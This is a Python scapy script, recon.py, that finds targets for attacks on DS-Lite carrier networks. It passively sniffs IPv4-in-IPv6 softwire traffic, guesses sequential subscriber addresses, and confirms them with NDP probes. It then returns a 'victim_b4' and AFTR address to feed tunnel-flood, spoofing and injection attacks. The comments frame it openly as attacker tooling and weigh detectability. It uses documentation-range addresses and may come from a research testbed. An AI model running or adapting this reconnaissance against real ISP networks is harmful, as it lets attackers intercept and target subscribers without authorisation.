#!/usr/bin/python
# recon.py — carrier-segment reconnaissance for the ISP-vantage DS-Lite attacks
# (T1 tunnel flood, T3 tunnel-endpoint spoof, T5 downstream inject).
#
# The ISP-vantage attacks need two pieces of target information: the AFTR's outer
# IPv6 and a victim B4's softwire identity. None of it is secret — the real
# prerequisite is on-path position. This module implements the escalation ladder:
#
#   1. PASSIVE  — sniff the unencrypted softwire (IPv4-in-IPv6, next-header 4) and
#                 read live B4 outer-IPv6 sources + the AFTR (their common peer).
#                 Invisible to the operator, but only sees *active* subscribers.
#   2. GUESS    — if passive yields nothing in the window, enumerate the
#                 predictable softwire prefix (::b41, ::b42, ...). Sequential B4
#                 numbering means the next subscriber is simply the next address.
#   3. ACTIVE   — NDP-probe the guessed addresses to confirm which B4s are live.
#                 Noisy and detectable (SAVI / edge IDS sees the solicitations),
#                 so it is the last resort for an idle, unpredictable victim.
#
# Each result records WHICH method found it, so the operator/attacker knows the
# detectability cost they paid.
import os
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from scapy.layers.inet6 import IPv6, ICMPv6ND_NS, ICMPv6ND_NA
from scapy.layers.l2 import Ether
from scapy.sendrecv import sniff, srp1

DEFAULT_PREFIX = "2001:db8:cafe"
DEFAULT_AFTR = f"{DEFAULT_PREFIX}::10"


def _is_softwire(pkt):
    """True if pkt is an IPv4-in-IPv6 softwire frame (outer IPv6, next-header=4)."""
    if not pkt.haslayer(IPv6):
        return False
    # next-header 4 = IPIP (IPv4 inside); ip6tnl may also use a DestOpt header,
    # but the canonical DS-Lite encapsulation we sniff is nh=4.
    return pkt[IPv6].nh == 4


def passive_discover(iface, timeout=8, aftr_hint=DEFAULT_AFTR, verbose=True):
    """PASSIVE: listen for softwire traffic; return ({b4_ipv6: count}, aftr or None).

    B4s are the outer-IPv6 sources of packets sent TO the AFTR; the AFTR is the
    common peer. Returns the set of observed B4 identities and the inferred AFTR.
    """
    if verbose:
        print(f"[recon] PASSIVE: listening for softwire traffic on {iface} "
              f"for {timeout}s (invisible) ...")
    seen = {}      # outer src -> packet count  (candidate B4s)
    peers = {}     # outer dst -> count         (candidate AFTR = busiest peer)

    def _tap(p):
        if not _is_softwire(p):
            return
        s, d = p[IPv6].src, p[IPv6].dst
        seen[s] = seen.get(s, 0) + 1
        peers[d] = peers.get(d, 0) + 1

    try:
        sniff(iface=iface, prn=_tap, store=False, timeout=timeout,
              filter="ip6")
    except Exception as e:
        if verbose:
            print(f"[recon] passive sniff error: {e}")

    # AFTR = the most-addressed peer that is not itself a B4 source, else the hint.
    aftr = None
    if peers:
        aftr = max(peers, key=peers.get)
    # B4 candidates = sources that are not the AFTR.
    b4s = {s: n for s, n in seen.items() if s != aftr}
    # If we saw the AFTR only as a source (return traffic), recover it.
    if aftr is None and aftr_hint in seen:
        aftr = aftr_hint
    if verbose:
        if b4s:
            print(f"[recon] PASSIVE found {len(b4s)} live B4(s): "
                  f"{', '.join(sorted(b4s))}  (AFTR={aftr or '?'})")
        else:
            print("[recon] PASSIVE found nothing (no active subscriber in window)")
    return b4s, aftr


def guess_b4s(prefix=DEFAULT_PREFIX, start=0x41, count=8):
    """GUESS: enumerate the predictable softwire prefix ::b4N (sequential)."""
    return [f"{prefix}::b{start + i:x}" if False else f"{prefix}::b4{i}"
            for i in range(1, count + 1)]


def active_probe(iface, candidates, src_ip6, per_timeout=1.0, verbose=True):
    """ACTIVE: NDP-solicit each candidate; return those that answer (are live).

    This is detectable: each Neighbor Solicitation is visible to SAVI / edge IDS.
    """
    if verbose:
        print(f"[recon] ACTIVE: NDP-probing {len(candidates)} candidate B4(s) "
              f"on {iface} (DETECTABLE) ...")
    live = []
    for tgt in candidates:
        try:
            # solicited-node multicast for the target
            snm = "ff02::1:ff" + tgt.split(":")[-1][-6:].rjust(6, "0")
            ans = srp1(
                Ether(dst="33:33:ff:00:00:00") /
                IPv6(src=src_ip6, dst=tgt) /
                ICMPv6ND_NS(tgt=tgt),
                iface=iface, timeout=per_timeout, verbose=0,
            )
            if ans is not None and ans.haslayer(ICMPv6ND_NA):
                live.append(tgt)
                if verbose:
                    print(f"[recon]   {tgt}  -> LIVE (answered NDP)")
        except Exception:
            pass
    if verbose and not live:
        print("[recon] ACTIVE: no candidate answered NDP")
    return live


def discover(iface, src_ip6, aftr_hint=DEFAULT_AFTR, exclude=None,
             passive_timeout=8, guess_count=8, verbose=True):
    """Full ladder. Returns dict: {victim_b4, aftr, method} or None.

    exclude: an IPv6 (e.g. the attacker's own) to never return as a victim.
    """
    exclude = set(exclude or [])
    exclude.add(src_ip6)

    # 1. PASSIVE
    b4s, aftr = passive_discover(iface, passive_timeout, aftr_hint, verbose)
    aftr = aftr or aftr_hint
    cand = [b for b in sorted(b4s, key=lambda x: -b4s[x]) if b not in exclude]
    if cand:
        return {"victim_b4": cand[0], "aftr": aftr, "method": "passive"}

    # 2. GUESS  +  3. ACTIVE confirm
    guesses = [g for g in guess_b4s(count=guess_count) if g not in exclude]
    live = active_probe(iface, guesses, src_ip6, verbose=verbose)
    live = [g for g in live if g not in exclude]
    if live:
        return {"victim_b4": live[0], "aftr": aftr, "method": "active-ndp"}

    # 4. last resort: return the first predictable guess unconfirmed
    if guesses:
        if verbose:
            print(f"[recon] FALLBACK: using predicted (unconfirmed) {guesses[0]}")
        return {"victim_b4": guesses[0], "aftr": aftr, "method": "guess-unconfirmed"}
    return None


# Standalone CLI: run recon and print the result (for operators / chaining).
if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser(description="DS-Lite carrier-segment recon (T1/T3/T5 target discovery)")
    ap.add_argument("--interface", required=True, help="carrier interface (e.g. eth-isp)")
    ap.add_argument("--src-ip6", default=f"{DEFAULT_PREFIX}::13a", help="attacker outer IPv6 (excluded from victims)")
    ap.add_argument("--aftr-ip6", default=DEFAULT_AFTR, help="AFTR hint (from provisioning)")
    ap.add_argument("--passive-timeout", type=int, default=8)
    args = ap.parse_args()
    r = discover(args.interface, args.src_ip6, args.aftr_ip6,
                 passive_timeout=args.passive_timeout)
    if r:
        print(f"\n[recon] RESULT: victim_b4={r['victim_b4']}  aftr={r['aftr']}  "
              f"method={r['method']}")
        sys.exit(0)
    print("\n[recon] RESULT: no target discovered")
    sys.exit(1)
